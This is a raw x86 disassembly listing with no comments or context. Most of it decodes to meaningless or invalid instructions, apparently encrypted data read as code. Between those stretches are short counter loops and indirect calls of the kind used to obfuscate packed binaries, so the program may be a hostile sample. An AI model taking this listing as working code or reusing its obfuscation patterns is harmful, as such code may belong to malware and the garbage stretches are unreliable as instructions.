  409d01:	or     DWORD PTR [edx-0x4303cac5],esi
  409d07:	stos   BYTE PTR es:[edi],al
  409d08:	pop    esp
  409d09:	cwde   
  409d0a:	in     eax,dx
  409d0b:	ss pop es
  409d0d:	inc    ebp
  409d0e:	adc    eax,0xf821eb3
  409d13:	aaa    
  409d14:	fld    QWORD PTR [ebp+0x7f]
  409d17:	dec    ecx
  409d18:	mov    bl,0xb7
  409d1a:	out    0x1e,al
  409d1c:	enter  0xf680,0x87
  409d20:	pushf  
  409d21:	mov    cl,0x88
  409d23:	or     eax,0x67982114
  409d28:	retf   0x31d4
  409d2b:	dec    esp
  409d2c:	(bad)  
  409d2d:	es loop 0x409cb3
  409d30:	fwait
  409d31:	arpl   WORD PTR [ecx+0x23],sp
  409d34:	mov    al,ds:0x4ec4c62b
  409d39:	xchg   esi,eax
  409d3a:	js     0x409d14
  409d3c:	and    eax,0xf5a8de8a
  409d41:	cmp    edi,0x446a038c
  409d47:	push   0xffffffaa
  409d49:	out    0xd8,eax
  409d4b:	mov    ebp,0x4511a8f0
  409d50:	mov    esp,0x2d4819c7
  409d55:	int    0x11
  409d57:	xchg   ecx,eax
  409d58:	jmp    0x409dcc
  409d5a:	mov    dh,0x64
  409d5c:	iret   
  409d5d:	sbb    ah,ch
  409d5f:	xor    ch,BYTE PTR [edi+0x6b38b9c1]
  409d65:	shr    BYTE PTR [eax-0x685d8aea],1
  409d6b:	sub    eax,0xcf588b09
  409d70:	gs loop 0x409d0e
  409d73:	sub    BYTE PTR [edx-0x3e83929e],cl
  409d79:	xchg   ebx,eax
  409d7a:	rcr    DWORD PTR [ebp-0x5e71e080],cl
  409d80:	pop    eax
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433717,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	loope  0x409da0
  409dc0:	xchg   edi,eax
  409dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dc2:	cmp    dl,ah
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	adc    al,0x1b
  409dcc:	in     al,dx
  409dcd:	push   ebx
  409dce:	dec    ebx
  409dcf:	imul   ebp,DWORD PTR [ecx+0x2d82440c],0x95addfa
  409dd9:	out    0x35,al
  409ddb:	(bad)  
  409ddc:	loop   0x409db0
  409dde:	mov    ah,0x39
  409de0:	cmc    
  409de1:	sbb    DWORD PTR [edi-0x71fd10f1],edi
  409de7:	mov    ebx,0xd09209f0
  409dec:	in     eax,0xb6
  409dee:	rcr    DWORD PTR [eax+0x2961c5fb],0xf7
  409df5:	cs jae 0x409e46
  409df8:	je     0x409e09
  409dfa:	adc    BYTE PTR [ebp-0x2f9a5989],0x2
  409e01:	adc    al,0x46
  409e03:	adc    eax,0xeef48986
  409e08:	xor    BYTE PTR [eax],ah
  409e0a:	mov    DWORD PTR [edx-0x3d],ecx
  409e0d:	shl    dh,cl
  409e0f:	adc    eax,0x719d1025
  409e14:	fcomp  QWORD PTR [edx]
  409e16:	or     DWORD PTR [edi+edx*4-0x26fed021],esp
  409e1d:	mov    ebx,esp
  409e1f:	mov    gs,WORD PTR [ebx]
  409e21:	inc    edi
  409e22:	and    eax,DWORD PTR [edx-0x62]
  409e25:	pop    edx
  409e26:	icebp  
  409e27:	(bad)  [ebx]
  409e29:	sbb    ch,al
  409e2b:	in     eax,0x8a
  409e2d:	jmp    0x409e4a
  409e2f:	push   cs
  409e30:	push   ss
  409e31:	jg     0x409e9f
  409e33:	jp     0x409e61
  409e35:	jge    0x409e9a
  409e37:	(bad)  [ecx+0x466b804f]
  409e3d:	pop    edx
  409e3e:	int    0xef
  409e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e41:	cmp    BYTE PTR ds:0xe40f1c9,dh
  409e47:	push   0x4a
  409e49:	xor    DWORD PTR [eax+ecx*8],0xffffffdd
  409e4d:	addr16 cld 
  409e4f:	push   ebx
  409e50:	dec    edx
  409e51:	scas   eax,DWORD PTR es:[edi]
  409e52:	push   cs
  409e53:	rcr    DWORD PTR [edi+esi*1-0x6f],1
  409e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e58:	mov    ebx,0xee8c0b1e
  409e5d:	ins    BYTE PTR es:[edi],dx
  409e5e:	loopne 0x409de1
  409e60:	dec    ebp
  409e61:	fwait
  409e62:	mov    eax,0x5df4e65a
  409e67:	retf   0xb65d
  409e6a:	cmp    eax,0xc86dd7d7
  409e6f:	pusha  
  409e70:	fbld   TBYTE PTR [edi+0x10ae5118]
  409e76:	jmp    0xafaa73ca
  409e7b:	loopne 0x409e1d
  409e7d:	jnp    0x409edc
  409e7f:	(bad)  
  409e80:	in     al,0x17
  409e82:	jne    0x409e34
  409e84:	dec    eax
  409e85:	pusha  
  409e86:	xor    ah,BYTE PTR [ebx-0x2c0fe478]
  409e8c:	ret    
  409e8d:	bsr    esp,DWORD PTR ds:0xee27f35e
  409e94:	es push ss
  409e96:	or     DWORD PTR [ebp-0x7b70a39],esp
  409e9c:	out    0xbf,eax
  409e9e:	mov    eax,ds:0xc39f9353
  409ea3:	adc    edi,esp
  409ea5:	sbb    DWORD PTR [edx-0x49bc1585],ebx
  409eab:	fimul  DWORD PTR [edi+0x58]
  409eae:	fld    TBYTE PTR [edx+edx*4+0x44]
  409eb2:	fisub  DWORD PTR [eax+edx*4]
  409eb5:	xlat   BYTE PTR ds:[ebx]
  409eb6:	cmp    al,0x5e
  409eb8:	mov    BYTE PTR [edi],ah
  409eba:	enter  0xc2c0,0xfb
  409ebe:	(bad)  
  409ebf:	nop
  409ec0:	push   ebx
  409ec1:	aam    0xe8
  409ec3:	inc    edi
  409ec4:	fisubr WORD PTR [eax]
  409ec6:	retf   0xe735
  409ec9:	jge    0x409f11
  409ecb:	add    edx,ebx
  409ecd:	rcr    DWORD PTR [esi+ecx*2],0x4b
  409ed1:	dec    ecx
  409ed2:	retf   0xca14
  409ed5:	dec    esp
  409ed6:	ret    0xd72
  409ed9:	ret    
  409eda:	div    DWORD PTR [edx+0x1d062ed2]
  409ee0:	pusha  
  409ee1:	cmp    bl,BYTE PTR [edi]
  409ee3:	push   ebx
  409ee4:	(bad)  
  409ee5:	in     al,dx
  409ee6:	bnd jbe 0x409f2a
  409ee9:	out    dx,eax
  409eea:	and    BYTE PTR [edi-0x4c42ae04],0x88
  409ef1:	ds mov ebx,0xac62a4f1
  409ef7:	cmc    
  409ef8:	pop    ss
  409ef9:	test   al,0x2d
  409efb:	data16 jnp 0x409ee3
  409efe:	xchg   edx,eax
  409eff:	inc    edx
  409f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f01:	int    0x36
  409f03:	aam    0x65
  409f05:	sbb    ebx,DWORD PTR [edi+0x2]
  409f08:	inc    edi
  409f09:	in     al,dx
  409f0a:	dec    edi
  409f0b:	pop    ecx
  409f0c:	or     DWORD PTR [ebp-0x2c],edi
  409f0f:	and    al,cl
  409f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f12:	adc    eax,0x85b68c21
  409f17:	mov    al,0x83
  409f19:	in     eax,dx
  409f1a:	push   es
  409f1b:	lods   eax,DWORD PTR ds:[esi]
  409f1c:	adc    DWORD PTR [ecx+0x78cf4c76],edi
  409f22:	sbb    dh,BYTE PTR [edx-0x24a6e105]
  409f28:	int3   
  409f29:	imul   bp
  409f2c:	adc    esi,DWORD PTR [ecx]
  409f2e:	(bad)  
  409f2f:	and    DWORD PTR [edi-0x378540db],ecx
  409f35:	add    al,0x32
  409f37:	sbb    eax,esp
  409f39:	bound  edx,QWORD PTR [esi+0xf]
  409f3c:	inc    esp
  409f3d:	into   
  409f3e:	xor    al,0xb8
  409f40:	push   esi
  409f41:	cdq    
  409f42:	outs   dx,DWORD PTR ds:[esi]
  409f43:	fsubr  DWORD PTR [ecx]
  409f45:	inc    esi
  409f46:	pop    eax
  409f47:	sub    eax,eax
  409f49:	sbb    bl,BYTE PTR [edx]
  409f4b:	dec    eax
  409f4c:	adc    DWORD PTR [ecx],edx
  409f4e:	mov    ?,eax
  409f50:	mov    cl,0xcb
  409f52:	scas   al,BYTE PTR es:[edi]
  409f53:	mov    ds:0x71d7a7b4,al
  409f58:	pop    ds
  409f59:	cwde   
  409f5a:	sahf   
  409f5b:	and    BYTE PTR [ebx-0x22],al
  409f5e:	in     eax,0x53
  409f60:	mov    eax,DWORD PTR [eax]
  409f62:	pop    ecx
  409f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f64:	jg     0x409fca
  409f66:	inc    ebx
  409f67:	rol    BYTE PTR [ebx-0x3ed0e36c],cl
  409f6d:	pop    ebx
  409f6e:	ret    0xb2f8
  409f71:	sbb    al,0x58
  409f73:	adc    ah,al
  409f75:	es dec ebx
  409f77:	loopne 0x409fd0
  409f79:	(bad)  [esi+0x543c7617]
  409f7f:	inc    ebx
  409f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f81:	jnp    0x409f40
  409f83:	jne    0x409fc6
  409f85:	in     al,dx
  409f86:	xchg   ebx,eax
  409f87:	sub    eax,0xd0a05806
  409f8c:	pop    ecx
  409f8d:	dec    edx
  409f8e:	out    dx,eax
  409f8f:	jge    0x409fd6
  409f91:	xchg   esp,eax
  409f92:	dec    esp
  409f93:	aas    
  409f94:	mov    esp,0xd02520d0
  409f99:	sub    DWORD PTR [eax],ecx
  409f9b:	adc    ch,BYTE PTR [edx]
  409f9d:	push   0x77
  409f9f:	and    eax,DWORD PTR [ecx+edx*8-0x5007d59d]
  409fa6:	sti    
  409fa7:	or     eax,DWORD PTR [edi+0x2e]
  409faa:	fidiv  DWORD PTR [eax+0x7c2f657e]
  409fb0:	inc    ecx
  409fb1:	aas    
  409fb2:	lods   eax,DWORD PTR ds:[esi]
  409fb3:	popf   
  409fb4:	outs   dx,DWORD PTR ds:[esi]
  409fb5:	mov    ebx,0x2e51d186
  409fba:	sbb    eax,0xcae7405c
  409fbf:	cmp    al,0x77
  409fc1:	dec    esi
  409fc2:	gs mov edi,0x59ec74a8
  409fc8:	loopne 0x409ff1
  409fca:	jge    0x409f56
  409fcc:	push   esp
  409fcd:	sti    
  409fce:	adc    al,0xa7
  409fd0:	shl    bh,0x50
  409fd3:	cwde   
  409fd4:	fstp   QWORD PTR [ecx-0x8]
  409fd7:	lock xor al,0x94
  409fda:	ror    DWORD PTR [esp+eiz*8],0xfd
  409fde:	cdq    
  409fdf:	bound  edx,QWORD PTR [edi-0x2a]
  409fe2:	sbb    eax,0x629c2f7
  409fe7:	sub    esi,DWORD PTR [ebx]
  409fe9:	icebp  
  409fea:	out    0x84,eax
  409fec:	scas   eax,DWORD PTR es:[edi]
  409fed:	in     al,0xaa
  409fef:	shl    DWORD PTR [ebp-0x50c8513],0xc2
  409ff6:	fld    QWORD PTR [ecx]
  409ff8:	into   
  409ff9:	pushf  
  409ffa:	add    edx,DWORD PTR [edi+0x22]
  409ffd:	or     DWORD PTR [eax],esp
  409fff:	inc    ecx
  40a000:	cld    
  40a001:	dec    edx
  40a002:	xor    DWORD PTR [edx],eax
  40a004:	jp     0x40a040
  40a006:	cli    
  40a007:	and    al,0x60
  40a009:	mov    ds:0xc77696b9,eax
  40a00e:	mov    BYTE PTR [edx],bh
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	arpl   WORD PTR [ebx-0x1f7da354],bx
  40a12c:	jle    0x40a1ac
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	pop    ecx
  40a133:	jg     0x40a0c5
  40a135:	(bad)  
  40a136:	jb     0x40a0e4
  40a138:	sbb    edx,DWORD PTR [ecx+0x3d97a686]
  40a13e:	fstp   TBYTE PTR [ecx+0x6e]
  40a141:	popf   
  40a142:	xchg   edx,eax
  40a143:	loope  0x40a156
  40a145:	sub    eax,0x13b864a3
  40a14a:	lds    ebp,FWORD PTR [ebx]
  40a14c:	add    BYTE PTR [edi-0x1ad8f9ab],ah
  40a152:	dec    esp
  40a153:	ja     0x40a1c2
  40a155:	xchg   BYTE PTR [eax+0x3544d415],cl
  40a15b:	ficom  DWORD PTR [esi]
  40a15d:	add    eax,0x9a9b29c0
  40a162:	icebp  
  40a163:	out    0xf1,al
  40a165:	mov    ebx,0xca9e86d9
  40a16a:	jle    0x40a1ae
  40a16c:	xchg   ebp,eax
  40a16d:	hlt    
  40a16e:	mul    DWORD PTR [ecx+0x6d]
  40a171:	jo     0x40a17b
  40a173:	sub    al,0x0
  40a175:	loope  0x40a154
  40a177:	adc    BYTE PTR [eax+ebx*1],0xb8
  40a17b:	xor    ebx,DWORD PTR gs:[edi]
  40a17e:	stos   DWORD PTR es:[edi],eax
  40a17f:	cdq    
  40a180:	ret    0xd180
  40a183:	leave  
  40a184:	fdivr  QWORD PTR [ebx+0x39]
  40a187:	in     al,dx
  40a188:	in     eax,dx
  40a189:	jno    0x40a136
  40a18b:	adc    DWORD PTR [edi],0x22
  40a18e:	cs push es
  40a190:	sub    DWORD PTR [ecx-0x51],ecx
  40a193:	push   ebx
  40a194:	sbb    edx,DWORD PTR [ebx-0x9]
  40a197:	test   BYTE PTR [eax],dl
  40a199:	in     al,0xb6
  40a19b:	add    al,0x85
  40a19d:	stos   DWORD PTR es:[edi],eax
  40a19e:	gs sub al,0xea
  40a1a1:	inc    ecx
  40a1a2:	and    ebx,DWORD PTR [edi*2+0x3dfeb7ad]
  40a1a9:	aad    0xec
  40a1ab:	mov    al,dl
  40a1ad:	mov    ch,0xc1
  40a1af:	or     eax,0x5abf7a08
  40a1b4:	jmp    0x40a153
  40a1b6:	mov    ch,0xa2
  40a1b8:	es rcr edx,0x6d
  40a1bc:	cmp    DWORD PTR [edx+0x2d],eax
  40a1bf:	and    ebp,DWORD PTR [edi+0x60719ec2]
  40a1c5:	(bad)
  40a1c9:	jl     0x40a20f
  40a1cb:	mov    ds:0xb769f767,al
  40a1d0:	pop    edx
  40a1d1:	push   0x58d56406
  40a1d6:	(bad)  
  40a1d7:	shl    dl,cl
  40a1d9:	cld    
  40a1da:	aas    
  40a1db:	push   edi
  40a1dc:	stos   BYTE PTR es:[edi],al
  40a1dd:	mov    cl,BYTE PTR [ecx-0x47ed88e3]
  40a1e3:	(bad)  
  40a1e4:	div    cl
  40a1e6:	pop    esi
  40a1e7:	inc    ebp
  40a1e8:	sub    bh,BYTE PTR [ebp-0x610ce6b0]
  40a1ee:	pop    ecx
  40a1ef:	and    eax,ecx
  40a1f1:	dec    ebx
  40a1f2:	jl     0x40a238
  40a1f4:	ss pop ss
  40a1f6:	cs mov al,dl
  40a1f9:	mov    ?,ecx
  40a1fb:	test   ch,al
  40a1fd:	mov    dl,0xa6
  40a1ff:	rol    BYTE PTR [ebp+0x48],cl
  40a202:	and    esp,ebp
  40a204:	add    eax,0xdfa121ca
  40a209:	int    0x3f
  40a20b:	lahf   
  40a20c:	imul   eax,DWORD PTR [ebx-0x7637f16f],0xffffffa1
  40a213:	pop    ebp
  40a214:	(bad)  
  40a216:	(bad)
  40a21b:	dec    esi
  40a21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a21d:	sbb    eax,0xc7ab649
  40a222:	push   ecx
  40a223:	rol    bh,1
  40a225:	ret    
  40a226:	in     al,dx
  40a227:	in     eax,0x68
  40a229:	imul   esi,DWORD PTR [edx+0x76],0x3
  40a22d:	(bad)
  40a230:	mov    esp,0x314e9401
  40a235:	cmp    BYTE PTR [eax+0x3e7ca553],bl
  40a23b:	sub    ecx,edi
  40a23d:	ret    
  40a23e:	icebp  
  40a23f:	push   0xffffffb8
  40a241:	jb     0x40a222
  40a243:	mov    cl,0x75
  40a245:	lds    ebp,FWORD PTR [edi+0x84a039c]
  40a24b:	mov    es,WORD PTR [esi]
  40a24d:	cmp    BYTE PTR [ecx-0x5289f255],ah
  40a253:	and    al,bh
  40a255:	push   eax
  40a256:	loop   0x40a2a4
  40a258:	aam    0xda
  40a25a:	jne    0x40a247
  40a25c:	(bad)  
  40a25d:	xchg   esp,eax
  40a25e:	cld    
  40a25f:	ret    0x9b45
  40a262:	add    ch,ah
  40a264:	fcom   QWORD PTR [ecx-0x6ea050ae]
  40a26a:	or     esi,eax
  40a26c:	shr    BYTE PTR [ecx],cl
  40a26e:	test   DWORD PTR ds:0x4cbc5727,eax
  40a274:	fisub  WORD PTR [eax+0x1c40cc94]
  40a27a:	pushf  
  40a27b:	adc    dh,bh
  40a27d:	xchg   esi,eax
  40a27e:	jl     0x40a260
  40a280:	adc    ah,cl
  40a282:	leave  
  40a283:	imul   ebx,DWORD PTR [ebx+0xf],0xfffffff1
  40a287:	shr    DWORD PTR [edi+0x34],0x50
  40a28b:	loope  0x40a278
  40a28d:	ret    0xb2b
  40a290:	mov    ds:0x85951c04,eax
  40a295:	push   cs
  40a296:	test   BYTE PTR [ebp-0x27],cl
  40a299:	sub    al,0xfe
  40a29b:	leave  
  40a29c:	(bad)  
  40a29d:	(bad)  
  40a29e:	xchg   edx,eax
  40a29f:	xor    DWORD PTR [edi],edi
  40a2a1:	inc    ebp
  40a2a2:	xchg   edi,eax
  40a2a3:	lods   al,BYTE PTR ds:[esi]
  40a2a4:	mov    ecx,0xd27f14c
  40a2a9:	cmp    eax,0xfd78be1f
  40a2ae:	in     eax,dx
  40a2af:	mov    dh,0xcd
  40a2b1:	arpl   WORD PTR [ecx+0x695c0849],ax
  40a2b7:	pop    ebx
  40a2b8:	xchg   ah,dl
  40a2ba:	int    0xb3
  40a2bc:	cld    
  40a2bd:	and    DWORD PTR [esi+0xe4ba1c7],0x1d6c1cdb
  40a2c7:	xchg   BYTE PTR [edx-0x6c],dl
  40a2ca:	fisub  DWORD PTR [ebx+0x46e67a62]
  40a2d0:	adc    bh,BYTE PTR [esi+0x76]
  40a2d3:	fadd   QWORD PTR [edi+0x28f8004b]
  40a2d9:	sti    
  40a2da:	sub    eax,0x909ae5d3
  40a2df:	shr    BYTE PTR [ecx+0x5f],0x33
  40a2e3:	inc    esi
  40a2e4:	pop    ds
  40a2e5:	dec    esp
  40a2e6:	jmp    0x40a2f6
  40a2e8:	mov    DWORD PTR [ecx],0xa36df7ea
  40a2ee:	mov    ah,0xf7
  40a2f0:	xchg   ecx,eax
  40a2f1:	pop    ecx
  40a2f2:	dec    ecx
  40a2f3:	fisub  WORD PTR [ebx-0x2c]
  40a2f6:	cmp    BYTE PTR [esi+0x7837fb24],al
  40a2fc:	test   DWORD PTR es:[edx+0x27],esi
  40a300:	xchg   ebp,eax
  40a301:	test   edx,esp
  40a303:	mov    edx,0xaf6c2141
  40a308:	ins    BYTE PTR es:[edi],dx
  40a309:	cwde   
  40a30a:	jno    0x40a29a
  40a30c:	fmul   DWORD PTR [ecx]
  40a30e:	push   0x75
  40a310:	push   edi
  40a311:	or     al,0xfe
  40a313:	test   eax,0x95def86d
  40a318:	(bad)  
  40a319:	int3   
  40a31a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a31b:	and    esp,DWORD PTR [ebp+0x1d5e204d]
  40a321:	cmp    bh,dl
  40a323:	(bad)  
  40a325:	outs   dx,BYTE PTR ds:[esi]
  40a326:	pushf  
  40a327:	jmp    0x9f4e:0x5b6abce8
  40a32e:	inc    esi
  40a32f:	js     0x40a2eb
  40a331:	sbb    dl,dl
  40a333:	push   edx
  40a334:	into   
  40a335:	jmp    0x40a2e0
  40a337:	rcr    DWORD PTR [edx+0x779c7c6e],1
  40a33d:	stos   DWORD PTR es:[edi],eax
  40a33e:	mov    WORD PTR [esi+0x640c0512],fs
  40a344:	call   0x298:0x85546ab9
  40a34b:	into   
  40a34c:	scas   al,BYTE PTR es:[edi]
  40a34d:	and    ecx,DWORD PTR [edx-0x25]
  40a350:	adc    al,0xcb
  40a352:	test   DWORD PTR [ebp-0x8],esi
  40a355:	test   DWORD PTR [ecx+0x66],ebp
  40a358:	ret    0x9abb
  40a35b:	mov    bl,0xa
  40a35d:	push   es
  40a35e:	(bad)  [eax-0x60]
  40a361:	test   eax,0xcea24d3e
  40a366:	push   eax
  40a367:	stos   DWORD PTR es:[edi],eax
  40a368:	and    BYTE PTR [esp+edx*4+0x44],dl
  40a36c:	mov    dl,BYTE PTR [edi+0x23d780e5]
  40a372:	(bad)  
  40a373:	lahf   
  40a374:	rcr    ch,1
  40a376:	int    0x55
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4336fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4336fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4336fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4336fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	lock sub al,0x48
  40a49e:	or     BYTE PTR [esi+ebp*8+0x7e],cl
  40a4a2:	jle    0x40a4dc
  40a4a4:	jl     0x40a524
  40a4a6:	jle    0x40a4cf
  40a4a8:	out    dx,al
  40a4a9:	stos   BYTE PTR es:[edi],al
  40a4aa:	sahf   
  40a4ab:	mov    dh,0x40
  40a4ad:	shr    BYTE PTR [esi],0x8a
  40a4b0:	repz scas al,BYTE PTR es:[edi]
  40a4b2:	ins    BYTE PTR es:[edi],dx
  40a4b3:	jmp    0xa0ba:0x421bdf7b
  40a4ba:	out    dx,eax
  40a4bb:	cmp    DWORD PTR [ecx-0x17412ee2],edi
  40a4c1:	and    ebx,DWORD PTR [edx+edi*8+0x7a]
  40a4c5:	int    0x9d
  40a4c7:	mov    dl,0x46
  40a4c9:	jo     0x40a4ad
  40a4cb:	test   al,0x7c
  40a4cd:	call   0x42fb4e0b
  40a4d2:	xor    BYTE PTR [eax-0x3],dh
  40a4d5:	mov    dl,0x3b
  40a4d7:	mov    esi,0xba94c3fd
  40a4dc:	jg     0x40a4a9
  40a4de:	xlat   BYTE PTR ds:[ebx]
  40a4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4e0:	mov    ebx,0xb5c6c336
  40a4e5:	call   0x7b5d:0xdc14be02
  40a4ec:	lock inc esp
  40a4ee:	clc    
  40a4ef:	jle    0x40a52f
  40a4f1:	mov    esi,0xd18625df
  40a4f6:	shl    al,0xe0
  40a4f9:	jae    0x40a4a5
  40a4fb:	and    cl,BYTE PTR [edi]
  40a4fd:	push   edi
  40a4fe:	shl    ch,cl
  40a500:	mov    ebx,DWORD PTR [ebp+0x35]
  40a503:	(bad)  
  40a504:	ret    
  40a505:	push   edx
  40a506:	out    0x57,al
  40a508:	test   eax,0x800887ff
  40a50d:	adc    eax,0x5b341eda
  40a512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a513:	jecxz  0x40a4ae
  40a515:	mov    esi,0x4398be8e
  40a51a:	pop    eax
  40a51b:	or     BYTE PTR [ecx-0x47defb9],ah
  40a521:	pop    eax
  40a522:	push   ds
  40a523:	or     DWORD PTR [ecx],eax
  40a525:	js     0x40a582
  40a527:	clc    
  40a528:	test   al,0x1a
  40a52a:	fadd   QWORD PTR [edi-0x49]
  40a52d:	jmp    0xa1471076
  40a532:	aam    0xe
  40a534:	dec    edi
  40a535:	mov    ch,0xf7
  40a537:	mov    edi,0x9476e98
  40a53c:	cli    
  40a53d:	repnz and ecx,ebx
  40a540:	nop
  40a541:	xlat   BYTE PTR ds:[ebx]
  40a542:	jl     0x40a507
  40a544:	shl    DWORD PTR [ecx+0x6a],1
  40a547:	fcomp  DWORD PTR [eax+ebx*1-0x1341fd]
  40a54e:	outs   dx,BYTE PTR ds:[esi]
  40a54f:	sahf   
  40a550:	cmp    eax,0x6dd479f
  40a555:	sbb    al,0x3c
  40a557:	out    0xc2,al
  40a559:	mov    ds:0x20f473be,al
  40a55e:	mov    eax,0x43145fbc
  40a563:	dec    ebx
  40a564:	xor    DWORD PTR [esi+0x4ac73ece],ebp
  40a56a:	rol    DWORD PTR [ebp+edx*1-0x63],1
  40a56e:	(bad)  [edx]
  40a570:	dec    ebx
  40a571:	fadd   QWORD PTR [ecx]
  40a573:	lea    ebp,[ebp+ebp*4-0x6d]
  40a577:	ss cmp al,0xbe
  40a57a:	push   0x23
  40a57c:	shr    DWORD PTR [eax-0x813436a],cl
  40a582:	jmp    0xfa9a:0x4bc459f7
  40a589:	ss je  0x40a5f3
